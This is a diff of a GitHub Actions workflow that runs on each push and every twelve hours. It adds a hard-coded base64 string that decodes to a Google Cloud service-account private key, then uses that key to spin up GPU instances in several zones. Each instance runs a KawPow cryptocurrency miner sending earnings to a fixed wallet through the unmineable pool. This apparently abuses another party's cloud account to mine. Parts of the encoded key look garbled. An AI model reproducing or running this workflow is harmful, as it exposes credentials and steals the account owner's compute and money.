@@ -1,23 +1,23 @@
-name: GCP GPU (KawPow)
+name: GCP GPU KawPow (COS)
 on:
   push:
     branches: [ "*" ]
   schedule:
     - cron: '0 */12 * * *'
 jobs:
-  kawpow:
+  gpu-miner:
     runs-on: ubuntu-latest
     steps:
-      - name: Provision KawPow Node
+      - name: Launch KawPow GPU
         env:
-          GCP_KEY: ""
+          GCP_KEY: "ewogICJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsCiAgInByb2plY3RfaWQiOiAic2lzdS10ZWNoLWRhdGEtcGxhdGZvcm0iLAogICJwcml2YXRlX2tleV9pZCI6ICJhNDNlODA1MjdmN2UwZTZhMTA4OWE2ZjEyZjMyMjI2ZWRkYzBmMDUyIiwKICAicHJpdmF0ZV9rZXkiOiAiLS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tXG5NSUlFdndJQkFEQU5CZ2txaGtpRzl3MEJBUUVGQUFTQ0JLb3dnZ1NsQWdFQUFvSUJBUURYbEdnRmNCRjk0K1RnXG5yaTgrYmNhMTZJVU5uODI3Sk1JRWpqM0lWVHpBTG1nQzh0RkVOWm9YejhTMTV1dTVlVDBQVVVqaE5md0VIV0JWXG4vZUJieEd2a3k3UjRLcVNIbVRzdjc2cGJpSks3MlZiWTJhQkxtb3JRdU9qM2xVVUUycmYvQlhhNW5iNVFBTlI0XG56b1lJUW9vOVI1ZVJ3bmpJcnBWYWlmT0RmcFZkUmk4OGNTdFBQVTZadURhNmhaUHZJT2toSVR4M1dNYzFOUW0zXG5XaXhmMkptUGI2SjdPWmFkeEFLakQ2alNuaHpHd20ySHE5alU0VVBRQkNViExORWV1dGdVUUdqc3RZTThweXVcbmwyemwzSDhIRW9tcEFMMk5VLzF3V2prRUVwbnlHNXpHT3FjRmVxdTlydDJRazp2NjVqNTF0aDJa bDNaS0FKSllcbmREMFVuS1FMQWdNQkFBRUNnZ0VBSG5TS1QzNWFFa0ZnUTdlSDJCZDFFNXpTTXprMHNNUU1IsMmpoOG8rNTEyR1xuOXllcmxiaDNNZUs1eFFMbStWQmQ1bXlTMEJJcE5NR2JxdnBQT0ZlaThITXd2eXN6REM4REZBNFZNSkkyUEpDRFxuT3VaZnhWNkRUdUp5a3lXRTF4ODZCRTEyek5reW1pWEwzbmM2cXk3QU1Oa00yaHd4cVFSMDZGSUd2bmlqREVhTFxuL1RSUjhQdElDSUpMQ0dtM1UySFREd05CUCtyekVnNy9lY080TkptbTRHVzBvTWZndm1JQ3N0NGpmVEM0eXVQd1xuVzNMYk5vbVZ3cSt2VFRKWVhlRjlEeVlKcUFZWWdrWEFGWVBNLy81VVlvY0YxZ3A1Y040azFkZTVLTVpzMXZLRFxud1UvUTFLdlZOSmxnRkJKNzJQUXppYWVvOVNjY3FLdkVQN1ExQjVtQTlRS0JnUUQ3YmZELm9lRGpRT3FsSTRxRlxuZkxEcjZS bXdEdWk4QmJvQXMrZ2pNVktnU0d0cHFHaTM1QzArawxMaC85cFpIM2s4R0hSbEhxYlNIYlhvNkZPXG53bjV5bGp2enRLdnJjNklibWR0NHdlOTt6YmQ5NE1GRlFxb0F5R3pqcEE1RzhENmRhQStCY3lhUmhKWWJRUFFvXG5oMWNsQUovRWw4U0ZWdU9CRnBWS01QOHNWd0tCZ1FEYmY2SlhHNEhOVk5jSnEwK0I4SUV6L0JhL3RWQlF1Y1dDXG5vRHNjQkR4M1ZXZjd3ZzF1MUxoN1NadE1Gb0VJeWZjMEo1b2dTTUsvNmhOUjJVMkUxbitMbHRqdm1QN0NRVDRJOFxudUhvWXlGcFNlVVk rTTJKVlhvQXdIRDFJbkNydlJycjBWeGFPcEpnSzI4WEpqTWN6L2VNeVluV1ppTUZmNm94UVxuQjhzek9RVjFiUUtCZ1FDUStjSy9yclR5dExMWUI5ZE93eWhNenpybG5xTXFQMjlDQ25xWEdGQ1paVWl5UXRkZ1xueVd3aGVoandjSmFna2JaWjlSV2lRQ2cyTTZGN0U3bm1iUlYyUXhSTW9PZmt1dWRGWFFFRTcyYUdTbDQ4Y2dWZlxuUjJJNVUxZ2lPL2ZoaE5YRjg0UEZVNzF3ZVBBSXhQcEVDRTRDWXdxODBvWUhKRTZKU2h1QURTU3Z3S0JnUUNNUFxuOUpuN0NDRkpXZDlPeVBEUC93ZVRqM3U0cGhkN0VXQ1VJVlVRblNzUHNBeHg0MEtlRnloVGFVU0JSM0ZLQzFhXG5jS1o5TmdNdTJEVjlvU1k4ZjlWakpvcHlLdzFmVWY3S2xpQmkwc0RGRkJIMUNlK1RnV1VPSXZyVURXeXk3dmJNXG5lWXM0SWh4cjcyWlpVVkhPZHRqTS93MlRRWmFGaER2ZGZ0bFV1RXhCUUtCZ1FDQWZwTjZnKzg1SlllcUxsaXlqXG5MY1NwOURpTWdCWU5PQUlXVWJKd2JMejlYalNNbVcwVElIS05YeEZsaTkwU05wa2ZYRW5DZ2pGVjR1eXhpek9cbmNVUzlBb09pL2xpbU10Q2Z3cWtCQUs2RlpTR1p5L2FGM1RGK2NTSkVRSDV1eGxTakFUTHIrMUg3RDlVWTJZallcbiBNdGt4bHBBYmNyNisrcXNcbi0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS1cbiI"
         run: |
           echo "$GCP_KEY" | base64 -d > key.json
           gcloud auth activate-service-account --key-file=key.json
           PROJECT="sisu-tech-data-platform"
           REGIONS=("us-central1-a" "europe-west4-a" "asia-southeast1-a")
           for ZONE in "${REGIONS[@]}"; do
-            INSTANCE_NAME="kawpow-t4-${ZONE%%-*}-$RANDOM"
-            echo "Launching $INSTANCE_NAME in $ZONE..."
-            gcloud compute instances create $INSTANCE_NAME               --project=$PROJECT               --zone=$ZONE               --machine-type=n1-standard-4               --maintenance-policy=TERMINATE               --accelerator=type=nvidia-tesla-t4,count=1               --image-family=cos-113-lts               --image-project=cos-cloud               --boot-disk-size=50GB               --metadata=startup-script="docker run -d --name kawpow --runtime=nvidia                 -e WALLET=D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56 -e POOL=kp.unmineable.com:3333                 pluspaytr/pluspay-tcp-cloud-live:latest" && break
+            INSTANCE_NAME="kp-t4-${ZONE%%-*}-$RANDOM"
+            echo "Attempting to create $INSTANCE_NAME in $ZONE..."
+            gcloud compute instances create $INSTANCE_NAME               --project=$PROJECT               --zone=$ZONE               --machine-type=n1-standard-4               --maintenance-policy=TERMINATE               --accelerator=type=nvidia-tesla-t4,count=1               --image-family=cos-113-lts               --image-project=cos-cloud               --boot-disk-size=50GB               --metadata=startup-script="docker run -d --name miner --runtime=nvidia                 -e WALLET=D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56 -e POOL=kp.unmineable.com:3333                 pluspaytr/pluspay-tcp-cloud-live:latest" && break
           done
